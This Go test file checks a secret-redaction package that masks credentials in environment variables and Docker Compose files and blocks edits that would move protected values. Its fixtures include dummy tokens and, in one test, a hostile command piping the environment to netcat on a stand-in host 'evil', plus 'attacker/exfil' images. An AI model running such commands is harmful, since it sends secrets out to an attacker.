// Copyright (c) 2026 McSparrow. All rights reserved.
// McHarbor is licensed under the McHarbor License. See LICENSE for details.

package envredact

import (
	"errors"
	"slices"
	"strings"
	"testing"
)

// TestClassifierCatchesTheReviewedGaps is M4 of the 2026-09-30 review, in both directions:
// each name and value shape below leaked to a viewer, and each "shown" row must stay
// readable so the classifier does not bury ordinary configuration under bullets.
func TestClassifierCatchesTheReviewedGaps(t *testing.T) {
	withheld := map[string]string{
		"DB_PASS":              "hunter2hunter2",
		"SMTP_PASS_FILE":       "/run/secrets/smtp",
		"GPG_PASSPHRASE":       "correct horse battery",
		"AUTH":                 "admin:admin",
		"BASIC_AUTH":           "user:pw",
		"CONNECTION_STRING":    "Server=db;Database=app",
		"PASSWORD_SALT":        "a1b2c3d4e5",
		"KUBECONFIG":           "/root/.kube/config",
		"SIGNING_SECRET":       "abc",
		"DATABASE_JDBC":        "jdbc:postgresql://db:5432/app?user=app&password=s3cr3tval",
		"MSSQL":                "Server=db;Database=app;User Id=sa;Password=s3cr3tval;",
		"JAVA_OPTS":            "-Xmx1g -Dspring.datasource.password=s3cr3tval",
		"GH":                   "ghp_" + strings.Repeat("a", 36),
		"GH_APP":               "ghs_" + strings.Repeat("B", 36),
		"SLACK":                "xoxb-1234567890-abcdefghij",
		"AWS_ID":               "AKIAABCDEFGHIJKLMNOP",
		"STRIPE":               "sk_live_" + strings.Repeat("x", 24),
		"JWT":                  "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
		"CERT_B64":             "LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0t",
		"NOTIFY_URL":           "https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXXXXXX",
		"DISCORD":              "https://discord.com/api/webhooks/123456/abcdefABCDEF",
		"ENCRYPTION_KEY":       "root-of-trust",
		"UPSTREAM":             "https://user:pw@example.com/",
		"SESSION_SECRET_VALUE": "longer-than-five",
	}
	shown := map[string]string{
		"PASSENGER_COUNT": "4",
		"COMPASS_URL":     "https://compass.example.com",
		"AUTHOR":          "Jane Doe",
		"OAUTH_ENABLED":   "true",
		"SESSION_TIMEOUT": "3600",
		"USE_TOKEN_AUTH":  "true",
		"LOG_LEVEL":       "info",
		"HOMEPAGE":        "https://example.com/path?page=2",
		"JAVA_TOOL_OPTS":  "-Xmx1g -Dfile.encoding=UTF-8",
		"CALLBACK":        "https://example.com/webhooks/github",
		"IMAGE_TAG":       "2026.09.01",
		"COOKIE_SECURE":   "false",
	}
	for name, value := range withheld {
		if !(Policy{}).Withhold(name, value) {
			t.Errorf("%s=%s was shown to a viewer; it carries a credential", name, value)
		}
	}
	for name, value := range shown {
		if (Policy{}).Withhold(name, value) {
			t.Errorf("%s=%s was withheld; it is ordinary configuration (false positive)", name, value)
		}
	}
}

// TestDefaultedInterpolationIsALiteral is M4's `${X:-literal}`: the default is written into
// the file, so it is judged like any other literal; a bare reference still is not.
func TestDefaultedInterpolationIsALiteral(t *testing.T) {
	doc := "services:\n  web:\n    image: app\n    environment:\n" +
		"      DB_PASSWORD: ${DB_PASSWORD:-hunter2hunter2}\n" +
		"      API_TOKEN: ${API_TOKEN}\n" +
		"      SIGNING_KEY: ${SIGNING_KEY:?set it}\n"
	got, _ := Policy{}.Compose(doc, nil)
	if strings.Contains(got, "hunter2hunter2") {
		t.Errorf("a defaulted interpolation leaked its literal:\n%s", got)
	}
	for _, kept := range []string{"API_TOKEN: ${API_TOKEN}", "SIGNING_KEY: ${SIGNING_KEY:?set it}"} {
		if !strings.Contains(got, kept) {
			t.Errorf("a bare reference was masked; want %q kept:\n%s", kept, got)
		}
	}
}

const wideCompose = `services:
  api:
    image: example/api:1
    command: ["serve", "--db-password=hunter2hunter2", "--port=8080"]
    entrypoint: /bin/sh -c "exec api --api-key=abcdef123456"
    healthcheck:
      test: ["CMD", "curl", "-H", "Authorization: Bearer abcdefghijklmnop", "http://localhost/health"]
    labels:
      com.example.api-key: labelsecretvalue
      traefik.enable: "true"
    build:
      context: .
      args:
        NPM_TOKEN: npm-token-value-123
        NODE_ENV: production
configs:
  app_config:
    content: "db.password=configsecret\nport=8080"
---
services:
  second:
    image: busybox
    environment:
      DB_PASSWORD: seconddocsecret
      MODE: blue
`

// TestComposeMasksCommandsLabelsArgsConfigsAndEveryDocument is the rest of M4: credentials
// outside environment, and in a later document of the file, reached viewers in the clear.
func TestComposeMasksCommandsLabelsArgsConfigsAndEveryDocument(t *testing.T) {
	got, withheld := Policy{}.Compose(wideCompose, nil)
	for _, secret := range []string{
		"hunter2hunter2", "abcdef123456", "abcdefghijklmnop", "labelsecretvalue",
		"npm-token-value-123", "configsecret", "seconddocsecret",
	} {
		if strings.Contains(got, secret) {
			t.Errorf("masked compose still contains %q:\n%s", secret, got)
		}
	}
	for _, kept := range []string{
		`"--db-password=` + Marker + `"`, `"--port=8080"`, "--api-key=" + Marker, "Bearer " + Marker,
		`traefik.enable: "true"`, "NODE_ENV: production", "MODE: blue", "context: .",
	} {
		if !strings.Contains(got, kept) {
			t.Errorf("masked compose lost %q:\n%s", kept, got)
		}
	}
	if len(withheld) < 7 {
		t.Errorf("withheld = %q, want every masked value named", withheld)
	}
	restored, err := RestoreCompose(strings.Replace(got, "MODE: blue", "MODE: green", 1), wideCompose)
	if err != nil {
		t.Fatalf("RestoreCompose: %v", err)
	}
	if want := strings.Replace(wideCompose, "MODE: blue", "MODE: green", 1); restored != want {
		t.Fatalf("restored compose differs from the stored file plus the edit:\n%s\n--- want ---\n%s", restored, want)
	}
	edited := strings.Replace(got, `"--port=8080"`, `"--port=9090"`, 1)
	if _, err := RestoreCompose(strings.Replace(edited, `"serve"`, `"serve2"`, 1), wideCompose); err != nil {
		t.Errorf("editing a command item without a mask must still restore: %v", err)
	}
	tampered := strings.Replace(got, `"--db-password=`+Marker+`"`, `"--other=`+Marker+`"`, 1)
	if _, err := RestoreCompose(tampered, wideCompose); !errors.Is(err, ErrComposeMaskedValue) {
		t.Errorf("an edited command item around a mask: err = %v, want ErrComposeMaskedValue", err)
	}
}

const pinnedValue = "pinned-root-of-trust-value"

const movedStored = `services:
  web:
    image: example/web:1
    environment:
      COPIED: pinned-root-of-trust-value
      DB_PASSWORD: hunter2hunter2
      MODE: blue
`

// TestRestoreRefusesMovingAValueNobodyMayReveal is M2 (1): keeping a pinned value while
// changing the image, command, entrypoint or labels hands it to a program the editor chose.
func TestRestoreRefusesMovingAValueNobodyMayReveal(t *testing.T) {
	p := Policy{Pinned: PinnedValues(pinnedValue)}
	masked, _ := p.Compose(movedStored, nil)
	if strings.Contains(masked, pinnedValue) {
		t.Fatalf("the pinned value was not masked:\n%s", masked)
	}
	for name, change := range map[string]string{
		"image":      "    image: attacker/exfil:1\n",
		"command":    "    image: example/web:1\n    command: [\"sh\", \"-c\", \"env | nc evil 80\"]\n",
		"entrypoint": "    image: example/web:1\n    entrypoint: /exfil\n",
		"labels":     "    image: example/web:1\n    labels:\n      x: y\n",
	} {
		doc := strings.Replace(masked, "    image: example/web:1\n", change, 1)
		if _, err := p.RestoreCompose(doc, movedStored, nil); !errors.Is(err, ErrComposeMaskedMoved) {
			t.Errorf("%s change with a kept pinned value: err = %v, want ErrComposeMaskedMoved", name, err)
		}
	}
	ordinary := strings.Replace(masked, "MODE: blue", "MODE: green", 1)
	if _, err := p.RestoreCompose(ordinary, movedStored, nil); err != nil {
		t.Errorf("an unrelated edit must still restore: %v", err)
	}
	revealable := strings.Replace(movedStored, "      COPIED: pinned-root-of-trust-value\n", "", 1)
	rm, _ := p.Compose(revealable, nil)
	imageOnly := strings.Replace(rm, "example/web:1", "example/web:2", 1)
	if _, err := p.RestoreCompose(imageOnly, revealable, nil); err != nil {
		t.Errorf("an image bump keeping a value a manage holder may reveal must restore: %v", err)
	}
}

// TestRestoreRefusesAMaskedValueReachableThroughAnAlias is M2 (2): an anchor on a restored
// value, aliased outside environment, would copy it into a label or another service.
func TestRestoreRefusesAMaskedValueReachableThroughAnAlias(t *testing.T) {
	stored := "services:\n  web:\n    image: example/web:1\n    environment:\n      DB_PASSWORD: hunter2hunter2\n      MODE: blue\n"
	cases := map[string]string{
		"label alias": "services:\n  web:\n    image: example/web:1\n    environment:\n      DB_PASSWORD: &p " + Marker + "\n      MODE: blue\n    labels:\n      leak: *p\n",
		"service merge": "services:\n  web: &w\n    image: example/web:1\n    environment:\n      DB_PASSWORD: " + Marker + "\n      MODE: blue\n" +
			"  evil:\n    <<: *w\n    image: attacker/exfil:1\n",
		"command alias": "services:\n  web:\n    image: example/web:1\n    environment: &e\n      DB_PASSWORD: " + Marker + "\n      MODE: blue\n    command: *e\n",
	}
	for name, doc := range cases {
		if _, err := RestoreCompose(doc, stored); !errors.Is(err, ErrComposeMaskedMoved) {
			t.Errorf("%s: err = %v, want ErrComposeMaskedMoved", name, err)
		}
	}
	shared := "x-env: &shared\n  DB_PASSWORD: hunter2hunter2\nservices:\n  web:\n    image: example/web:1\n    environment: *shared\n"
	masked, _ := Policy{}.Compose(shared, nil)
	if _, err := RestoreCompose(masked, shared); err != nil {
		t.Errorf("environment: *shared is an alias inside environment and must restore: %v", err)
	}
}

// TestMovedWithheldNamesOnlyUnrevealableValues backs the container recreate half of M2.
func TestMovedWithheldNamesOnlyUnrevealableValues(t *testing.T) {
	p := Policy{Pinned: PinnedValues(pinnedValue)}
	current := []string{"COPIED=" + pinnedValue, "DB_PASSWORD=hunter2hunter2", "MODE=blue"}
	incoming := []string{"COPIED=" + Marker, "DB_PASSWORD=" + Marker, "MODE=green"}
	if got := p.MovedWithheld(incoming, current); !slices.Equal(got, []string{"COPIED"}) {
		t.Fatalf("MovedWithheld = %q, want [COPIED]", got)
	}
	mc := Policy{McHarbor: true}
	if got := mc.MovedWithheld([]string{"ENCRYPTION_KEY=" + Marker}, []string{"ENCRYPTION_KEY=abc"}); len(got) != 1 {
		t.Fatalf("a McHarbor root-of-trust variable must count as unrevealable: %q", got)
	}
}

// TestRegisteredPinnedValuesBindEveryPolicy is L2 of the 2026-09-30 review: the AI assistant,
// workflow nodes and the Swarm plugin build a Policy with no Pinned list, so the values this
// process registered at startup must bind them anyway.
func TestRegisteredPinnedValuesBindEveryPolicy(t *testing.T) {
	const registered = "registered-root-of-trust-4f2a"
	RegisterPinned(registered, "short")
	if !(Policy{Reveal: true}).Withhold("HARMLESS_NAME", "prefix-"+registered) {
		t.Error("a revealing Policy without Pinned returned a registered root-of-trust value")
	}
	if got := (Policy{Reveal: true}).MaskInline("--flag=" + registered); strings.Contains(got, registered) {
		t.Errorf("MaskInline kept a registered value: %q", got)
	}
	if got := ReplacePinned("compose: invalid reference "+registered, "[redacted]"); strings.Contains(got, registered) {
		t.Errorf("ReplacePinned kept a registered value: %q", got)
	}
	if (Policy{Reveal: true}).Withhold("OTHER", "short") {
		t.Error("a value below the safe minimum length was registered")
	}
}
